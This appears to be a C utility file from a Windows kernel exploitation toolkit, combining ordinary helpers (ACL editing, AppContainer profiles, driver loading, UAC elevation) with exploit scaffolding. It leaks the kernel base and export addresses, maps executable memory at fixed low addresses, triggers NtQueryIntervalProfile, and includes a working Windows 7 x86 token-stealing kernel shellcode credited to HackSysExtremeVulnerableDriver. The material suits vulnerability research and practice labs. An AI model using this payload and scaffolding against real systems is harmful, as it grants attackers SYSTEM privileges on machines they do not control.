/*
* common.h - Util functions
* Author : Marche147 [bitmarche@gmail.com]
* Description : ANSI build
*/

#include "common.h"

// ntdll exports.
pNtQuerySystemInformation NtQuerySystemInformation = NULL;
pNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
pNtQueryIntervalProfile	NtQueryIntervalProfile = NULL;
pNtQueryInformationProcess NtQueryInformationProcess = NULL;
pDbgBreakPoint DbgBreakPoint = NULL;
pRtlNtStatusToDosError RtlNtStatusToDosError = NULL;

#ifndef _WIN64
__declspec(naked) uint32_t __stdcall NtSyscall(uint32_t SyscallIndex,uint32_t ArgCount,void* ArgArray[])
{
	__asm
	{
		push ebx
		push esi
		push ebp
		mov ebp, esp
		sub esp, 0x100
		mov ebx, [ebp+16]	// syscall index
		mov esi, [ebp+20]	// argcount
		mov edx, [ebp+24]	// argarray

		xor ecx, ecx
copy_stack_param:
		mov eax, [edx+ecx*4]
		mov [esp+ecx*4+4], eax		// +8 for caller addr
		inc ecx
		cmp ecx, esi
		jnz copy_stack_param

		mov eax, ebx	// syscall index
		mov edx, 0x7FFE0300
		call dword ptr [edx]

		mov esp, ebp
		pop ebp
		pop esi
		pop ebx
		ret
	}
}
#else 
#pragma comment(lib, "syscall.lib")
extern uint64_t NtSyscall(uint64_t SyscallIndex, uint64_t ArgCount, void* ArgArray[]);
#endif

PVOID GetProcFromModule(LPTSTR szModName,LPCSTR szFuncName)
{
	return GetProcAddress(LoadLibrary(szModName),szFuncName);
}

BOOL EnablePrivilege(LPTSTR szPrivName)
{
	BOOL result = FALSE;
	HANDLE token;
	LUID luid;
	TOKEN_PRIVILEGES tpl;

	result = OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&token);
	if(!result)		return result;
	result = LookupPrivilegeValue(NULL,szPrivName,&luid);
	if(!result)		goto cleanup;
	tpl.PrivilegeCount = 1;
	tpl.Privileges[0].Luid = luid;
	tpl.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	result = AdjustTokenPrivileges(token,FALSE,&tpl,sizeof(tpl),NULL,NULL);

cleanup:
	CloseHandle(token);
	return result;
}

void* GetKernelBaseEx(char* ImageName, size_t maxlen) 
{
	void* result = NULL;
	//DWORD os;
	PSYSTEM_MODULE_INFORMATION pmod;
	NTSTATUS status;
	ULONG retlen;

	if (NtQuerySystemInformation == NULL) {
		NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQuerySystemInformation");
		if (NtQuerySystemInformation == NULL)
		{
			//printf("[-] Couldn't find NtQuerySystemInformation.\n");
			return NULL;
		}
	}

	/* TODO : add OS version & security check, win7 above don't support this on LowIntegrityLevel. */
	status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &retlen);
	//printf("[*] Status = 0x%08x, retlen = %d\n", status, retlen);
	if(status == 0xc0000023L || status == 0xC0000004L) {
		pmod = (PSYSTEM_MODULE_INFORMATION)halloc(retlen);
		status = NtQuerySystemInformation(SystemModuleInformation, pmod, retlen, &retlen);
		if(status >= 0x80000000) {
			//printf("[-] Failed Status = 0x%08x\n", status);
			hfree(pmod);
			return NULL;
		}
		for(DWORD i=0;i<pmod->Count;i++) {
			if(strstr(pmod->Module[i].ImageName, "ntoskrnl.exe") ||
				strstr(pmod->Module[i].ImageName, "ntkrnlpa.exe")	// adding more kernel name
				)  {
				//printf("[+] Module %s Base %#p\n", pmod->Module[i].ImageName, pmod->Module[i].Base);
				strncpy_s(ImageName, maxlen, pmod->Module[i].ImageName, 256);
				result = pmod->Module[i].Base;
				hfree(pmod);
				return result;
			}
		}
	}
	return NULL;
}

BOOL SetObjectSecurityDenyOne(HANDLE object, PSID sid, DWORD access)
{
	BOOL result = FALSE;
	PACL pacl = (PACL)halloc(1024);
	if(!pacl)	return result;
	result = InitializeAcl(pacl, 1024, ACL_REVISION);
	if(!result) goto cleanup;
	result = AddAccessDeniedAce(pacl, ACL_REVISION, access, sid);
	if(result < 0)	goto cleanup;
	DWORD res = SetSecurityInfo(object, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pacl, NULL);
	if(res != ERROR_SUCCESS)	goto cleanup;
	result = TRUE;
cleanup:
	hfree(pacl);
	return result;
}

DWORD FindProcessId(LPTSTR processName) 
{
	HANDLE hSnap;
	DWORD result = -1;
	BOOL b;
	PROCESSENTRY32 pe32;

	ZeroMemory(&pe32, sizeof(pe32));
	pe32.dwSize = sizeof(pe32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(!hSnap) return result;
	b = Process32First(hSnap, &pe32);
	while(b) {
		if(strcmp(processName, pe32.szExeFile) == 0	) {
			result = pe32.th32ProcessID;
			break;
		}
		b = Process32Next(hSnap, &pe32);
	}
	CloseHandle(hSnap);
	return result;
}

// this enumrates the kernel by name
HMODULE _TryLoadKernel(char* kern)
{
	HMODULE result = NULL;
	if (strstr(kern, "ntoskrnl.exe")) {
		result = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (result) return result;
	}
	else if (strstr(kern, "ntkrnlpa.exe")) {
		result = LoadLibraryExA("ntkrnlpa.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (result) return result;
	}
	return NULL;
}

PVOID LoadExportedKernelSymAddress(LPTSTR SymName)
{
	HMODULE kernel;
	PVOID result = NULL, base, func;
	char kern[256];
	
	base = GetKernelBaseEx(kern, 256);
	//printf("[+] Base = 0x%08x. kernel path = %s\n", base, kern);
	if (!base)	return NULL;	// DID NOT FIND KERNEL
	kernel = _TryLoadKernel(kern);
	if (!kernel)		return NULL;
	func = (PVOID)GetProcAddress(kernel, SymName);
	if (!func)	return NULL;
	result = (PVOID)((ULONG_PTR)(base)+(ULONG_PTR)(func)-(ULONG_PTR)kernel);
	return result;
}

PVOID AllocateFixedPages(PVOID Address, ULONG PageCount)
{
	NTSTATUS s;
	PVOID base = Address;
	SIZE_T rsize = PageCount * PAGE_SIZE;

	if (Address == NULL)		base = (PVOID)1;	// HACK
	if (!NtAllocateVirtualMemory) {
		NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(LoadLibrary("ntdll.dll"), "NtAllocateVirtualMemory");
		if (!NtAllocateVirtualMemory)	return NULL;
	}
	s = NtAllocateVirtualMemory((HANDLE)-1, &base, NULL, &rsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (s >= 0) {
		return base;
	}

	return NULL;
}

VOID CallNtQueryIntervalProfile(void)
{
	ULONG ret;
	if (!NtQueryIntervalProfile) {
		NtQueryIntervalProfile = (pNtQueryIntervalProfile)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryIntervalProfile");
		if (!NtQueryIntervalProfile)		return;
	}
	NtQueryIntervalProfile(0x1337, &ret);
	return;
}

VOID Breakpoint(void)
{
#if defined(_COMMON_DEBUG)
#ifdef _WIN64
	DebugBreak();
#else
	__asm int 3;
#endif
#endif
	return;
}

PVOID NtCurrentPeb(void)
{
	PVOID result = NULL;
	PROCESS_BASIC_INFORMATION pbi;
	NTSTATUS s = 0xC0000001;
	ULONG retlen;
#ifndef _WIN64
	__asm {
		mov eax, fs:[0x30]	// teb->Peb
		mov result, eax
	}
#else
	if (!NtQueryInformationProcess) {
		NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryInformationProcess");
		if (!NtQueryInformationProcess)	return NULL;
	}
	
	s = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &retlen);
	if (!NT_SUCCESS(s)) {
		return NULL;
	}
	result = pbi.PebBaseAddress;
#endif
	return result;
}

#ifndef _WIN64

/* Win7 Offsets */
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

/* Copied from HackSysExtremeVulnerableDriver project */
VOID TokenStealingPayloadWin7() {
	// Importance of Kernel Recovery
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
		sub eax, FLINK_OFFSET
		cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
		jne SearchSystemPID

		mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
		mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
		; with SYSTEM process nt!_EPROCESS.Token
		; End of Token Stealing Stub

		popad; Restore registers state

		; Kernel Recovery Stub
		xor eax, eax; Set NTSTATUS SUCCEESS
		add esp, 12; Fix the stack
		pop ebp; Restore saved EBP
		ret 8; Return cleanly
	}
}

#endif

HRESULT FindOrCreateAppContainerProfileEx(LPCWSTR pszChildFilePath, LPCWSTR pszDescription, PSID_AND_ATTRIBUTES pCapabilities, DWORD dwCapabilityCount ,PSID *ppSid)
{
	HRESULT hr = E_FAIL;
	HRESULT _hr = E_FAIL;

	if (!ppSid) {
		goto Exit;
	}

	LPWSTR pszAppContainerName = PathFindFileNameW(pszChildFilePath);

	PSID pSid = NULL;

	*ppSid = NULL;

	_hr = CreateAppContainerProfile(
		pszAppContainerName,
		pszAppContainerName,
		pszDescription,
		pCapabilities,
		dwCapabilityCount,
		&pSid
	);
	if (_hr == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
		if (!SUCCEEDED(DeriveAppContainerSidFromAppContainerName(
			pszAppContainerName,
			&pSid
		))) {
			goto Exit;
		}
		_hr = S_OK;
	}
	if (!SUCCEEDED(_hr)) {
		goto Exit;
	}

	*ppSid = pSid;
	pSid = NULL;

	hr = S_OK;
Exit:
	if (pSid != NULL) {
		FreeSid(pSid);
	}

	return hr;
}

HRESULT GetAppContainerSid(LPCWSTR pszChildFilePath, PSID *ppSid)
{
	HRESULT hr = E_FAIL;

	LPWSTR pszAppContainerName = PathFindFileNameW(pszChildFilePath);
	PSID pSid = NULL;

	if (!SUCCEEDED(DeriveAppContainerSidFromAppContainerName(
		pszAppContainerName,
		&pSid
	))) {
		goto Exit;
	}

	*ppSid = pSid;
	pSid = NULL;

	hr = S_OK;
Exit:
	if (pSid != NULL) {
		FreeSid(pSid);
	}

	return hr;
}

HRESULT DestroyAppContainerProfile(LPCWSTR pszChildFilePath)
{
	HRESULT hr = E_FAIL;
	LPWSTR pszAppContainerName = PathFindFileNameW(pszChildFilePath);
	PSID pSid = NULL;

	if (pszChildFilePath != NULL) {
		goto Exit;
	}

	if (!SUCCEEDED(DeriveAppContainerSidFromAppContainerName(
		pszAppContainerName,
		&pSid
	))) {
		goto Exit;
	}

	if (!SUCCEEDED(DeleteAppContainerProfile(pszAppContainerName))) {
		goto Exit;
	}

	hr = S_OK;
Exit:
	if (pSid != NULL) {
		FreeSid(pSid);
	}

	return hr;
}

HRESULT AddOrRemoveAceOnFileObjectAcl(
	BOOL IsRemoveOperation,
	LPCTSTR pszFilePath,
	PSID pSid,
	DWORD dwAccessMask
)
{
	HRESULT hr = E_FAIL;

	DWORD DescSize = 0;
	SECURITY_DESCRIPTOR NewDesc = { 0 };
	PSECURITY_DESCRIPTOR pOldDesc = NULL;

	BOOL DaclPresent = FALSE;
	BOOL DaclDefaulted = FALSE;
	DWORD cbNewDacl = 0;
	PACL pOldDacl = NULL;
	PACL pNewDacl = NULL;
	ACL_SIZE_INFORMATION AclInfo = { 0 };

	ULONG i = 0;
	LPVOID pTempAce = NULL;

	if (pszFilePath == NULL || pSid == NULL) {
		goto Exit;
	}

	if (GetFileSecurity(
		pszFilePath,
		DACL_SECURITY_INFORMATION,
		NULL,
		0,
		&DescSize
	) != 0) {
		goto Exit;
	}

	pOldDesc = (PSECURITY_DESCRIPTOR)halloc(DescSize);
	if (!pOldDesc) {
		goto Exit;
	}

	if (GetFileSecurity(
		pszFilePath,
		DACL_SECURITY_INFORMATION,
		pOldDesc,
		DescSize,
		&DescSize
	) == 0) {
		goto Exit;
	}

	if (!InitializeSecurityDescriptor(
		&NewDesc,
		SECURITY_DESCRIPTOR_REVISION
	)) {
		goto Exit;
	}

	if (!GetSecurityDescriptorDacl(
		pOldDesc,
		&DaclPresent,
		&pOldDacl,
		&DaclDefaulted
	)) {
		goto Exit;
	}
	if(pOldDacl == NULL) goto Exit; // TODO: FIXME: This is a possible scenario
									//   On certain file systems, a DACL will not be present.
									//   For now, we will just exit with an error. Perhaps in
									//   the future, creating a new DACL might work out better.

	AclInfo.AceCount = 0;
	AclInfo.AclBytesFree = 0;
	AclInfo.AclBytesInUse = sizeof(ACL);

	if (!GetAclInformation(
		pOldDacl,
		&AclInfo,
		sizeof(AclInfo),
		AclSizeInformation
	)) {
		goto Exit;
	}

	if (IsRemoveOperation) {
		cbNewDacl = AclInfo.AclBytesInUse - sizeof(ACCESS_ALLOWED_ACE) - GetLengthSid(pSid) + sizeof(DWORD);
	}
	else {
		cbNewDacl = AclInfo.AclBytesInUse + sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(pSid) - sizeof(DWORD);
	}

	pNewDacl = (PACL)halloc(cbNewDacl);
	if(pNewDacl == NULL) goto Exit;
	if (!InitializeAcl(
		pNewDacl,
		cbNewDacl,
		ACL_REVISION
	)) goto Exit;

	if (IsRemoveOperation) {
		for (i = 0; i < AclInfo.AceCount; i++) {
			if (!GetAce(pOldDacl, i, &pTempAce)) goto Exit;
			if (!EqualSid(pSid, &(((ACCESS_ALLOWED_ACE *)pTempAce)->SidStart))) {
				if(!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, ((PACE_HEADER)pTempAce)->AceSize)) goto Exit;
			}
		}
	}
	else {
		for (i = 0; i < AclInfo.AceCount; i++) {
			if(!GetAce(pOldDacl, i, &pTempAce)) goto Exit;
			if (((ACCESS_ALLOWED_ACE *)pTempAce)->Header.AceFlags & INHERITED_ACE) break;
			if (EqualSid(pSid, &(((ACCESS_ALLOWED_ACE *)pTempAce)->SidStart))) {
				hr = HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS);
				goto Exit;
			}
			if(!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, ((PACE_HEADER)pTempAce)->AceSize)) goto Exit;
		}

		if(!AddAccessAllowedAce(
			pNewDacl,
			ACL_REVISION,
			dwAccessMask,
			pSid
		)) goto Exit;

		for (; i < AclInfo.AceCount; i++) {
			if(!GetAce(pOldDacl, i, &pTempAce)) goto Exit;
			if(!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, ((PACE_HEADER)pTempAce)->AceSize)) goto Exit;
		}
	}

	if(!SetSecurityDescriptorDacl(
		&NewDesc,
		TRUE,
		pNewDacl,
		FALSE
	)) goto Exit;

	if(!SetFileSecurity(
		pszFilePath,
		DACL_SECURITY_INFORMATION,
		&NewDesc
	)) goto Exit;

	hr = S_OK;
Exit:
	if (pNewDacl != NULL) {
		hfree(pNewDacl);
	}

	if (pOldDesc != NULL) {
		hfree(pOldDesc);
	}

	return hr;
}

// Generates a [min, max) random 
DWORD RandRange32(DWORD min, DWORD max)
{
	static bool g_RandomInit = false;
	HCRYPTPROV cp;
	DWORD result;
	
	if (!CryptAcquireContext(&cp, "RandomContainer", NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
		goto DefaultRandomGen;
	}
	if (!CryptGenRandom(cp, sizeof(result), (BYTE*)&result)) {
		CryptReleaseContext(cp, 0);
		goto DefaultRandomGen;
	}
	CryptReleaseContext(cp, 0);
	goto Range;

DefaultRandomGen:
	if (!g_RandomInit) {
		srand(time(NULL));
		g_RandomInit = true;
	}
	result = rand();
Range:
	result = (result % (max - min)) + min;
	return result;
}

VOID LogPrint(char* fmt, ...)
{
	va_list args;
	char output_buffer[0x400];	//

	va_start(args, fmt);
	vsprintf_s(output_buffer, 0x400, fmt, args);
	va_end(args);
	OutputDebugStringA(output_buffer);

#ifdef _LOG_FILE
	FILE* fp = NULL;
	static char* file_name = NULL;
	time_t t = time(NULL);
	struct tm* tm = localtime(&t);

	if (!file_name) {
		file_name = (char*)halloc(0x100);
		if (!file_name)	return;
		strftime(file_name, 0x100, _LOG_PATH "%Y_%m_%d_%H_%M_%S.log", tm);
	}
	fp = fopen(file_name, "w");
	if (fp) {
		char time_buffer[0x100];
		strftime(time_buffer, 0x100, "[%F %T]", tm);
		fprintf(fp, "%s %s", time_buffer, output_buffer);
		fflush(fp);
		fclose(fp);
	}
#endif

	return;
}

BOOL AnsiToUTF8(CHAR* szAnsiStr, WCHAR* wszUnicodeStr, ULONG ulBufLen)
{
	MultiByteToWideChar(CP_UTF8, 0, szAnsiStr, -1, wszUnicodeStr, ulBufLen/2);	// buf length is in character
	return TRUE;
}

BOOL UTF8ToAnsi(WCHAR* wszUnicodeStr, CHAR* szAnsiStr, ULONG ulBufLen)
{
	WideCharToMultiByte(CP_UTF8, 0, wszUnicodeStr, -1, szAnsiStr, ulBufLen, NULL, NULL);
	return TRUE;
}

BOOL GetTokenInformationEx(HANDLE token, TOKEN_INFORMATION_CLASS tlc, PVOID *info, DWORD* retlen)
{
	DWORD retlen_1;
	PVOID buffer;

	if (!GetTokenInformation(token, tlc, NULL, 0, &retlen_1) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		buffer = malloc(retlen_1);
		if (!buffer) {
			*info = NULL;
			*retlen = 0;
			return 0;
		}
		*retlen = retlen_1;
		if (GetTokenInformation(token, tlc, buffer, retlen_1, &retlen_1)) {
			*info = buffer;
			return 1;
		}
		free(buffer);
	}

	return 0;
}

VOID
RtlInitUnicodeString(
	OUT PUNICODE_STRING DestinationString,
	IN PCWSTR SourceString OPTIONAL
)

/*++

Routine Description:

The RtlInitUnicodeString function initializes an NT counted
unicode string.  The DestinationString is initialized to point to
the SourceString and the Length and MaximumLength fields of
DestinationString are initialized to the length of the SourceString,
which is zero if SourceString is not specified.

Arguments:

DestinationString - Pointer to the counted string to initialize

SourceString - Optional pointer to a null terminated unicode string that
the counted string is to point to.


Return Value:

None.

--*/

{

	SIZE_T Length;

	DestinationString->MaximumLength = 0;
	DestinationString->Length = 0;
	DestinationString->Buffer = (PWSTR)SourceString;
	if ((SourceString)) {
		Length = wcslen(SourceString) * sizeof(WCHAR);

		//ASSERT(Length < MAX_USTRING);

		if (Length >= MAX_USTRING) {
			Length = MAX_USTRING - sizeof(UNICODE_NULL);
		}

		DestinationString->Length = (USHORT)Length;
		DestinationString->MaximumLength = (USHORT)(Length + sizeof(UNICODE_NULL));
	}

	return;
}

BOOL CheckAndElevate()
{
	if (IsUserAnAdmin())		return TRUE;
	WCHAR filePath[MAX_PATH];
	SHELLEXECUTEINFOW sei;

	ZeroMemory(&sei, sizeof(sei));
	sei.cbSize = sizeof(sei);
	sei.lpVerb = L"runas";
	GetModuleFileNameW(GetModuleHandle(NULL), filePath, MAX_PATH * sizeof(WCHAR));
	sei.lpFile = filePath;
	sei.nShow = SW_SHOW;

	if(ShellExecuteExW(&sei)) ExitProcess(-1);
	return FALSE;	// never returns
}

BOOL LoadDriver(char* driverName, char* driverPath, BOOL forceOverride)
{
	SC_HANDLE scm;
	SC_HANDLE scService;
	BOOL result = FALSE;
	char FilePath[MAX_PATH];


	GetFullPathName(driverPath, MAX_PATH, FilePath, NULL);
	scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scm)	return FALSE;

	scService = CreateService(scm, driverName, driverName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, FilePath, NULL, NULL, NULL, NULL, NULL);
	if (!scService) {
		if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_SERVICE_EXISTS) {
			scService = OpenService(scm, driverName, SERVICE_ALL_ACCESS);
			if (!scService) goto Finish;
			if (forceOverride) {	// recreate
				if (!DeleteService(scService)) goto Finish;
				scService = CreateService(scm, driverName, driverName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driverPath, NULL, NULL, NULL, NULL, NULL);
				if (!scService)	goto Finish;
			}
		}
		else goto Finish;
	}
	if (!StartService(scService, 0, NULL)) {
		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) result = TRUE;
	}
	result = TRUE;

Finish:
	if (scm) CloseServiceHandle(scm);
	if (scService) CloseServiceHandle(scService);
	return result;
}

BOOL UnloadDriver(char* driverName)
{
	BOOL result = FALSE;
	SC_HANDLE scm = NULL, scService = NULL;
	SERVICE_STATUS s;

	scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scm) return FALSE;

	scService = OpenService(scm, driverName, SERVICE_ALL_ACCESS);
	if (scService) {
		ControlService(scService, SERVICE_CONTROL_STOP, &s);
		if (DeleteService(scService))	result = TRUE;
	}

Finish:
	if (scm)		CloseServiceHandle(scm);
	if (scService)	CloseServiceHandle(scService);
	return result;
}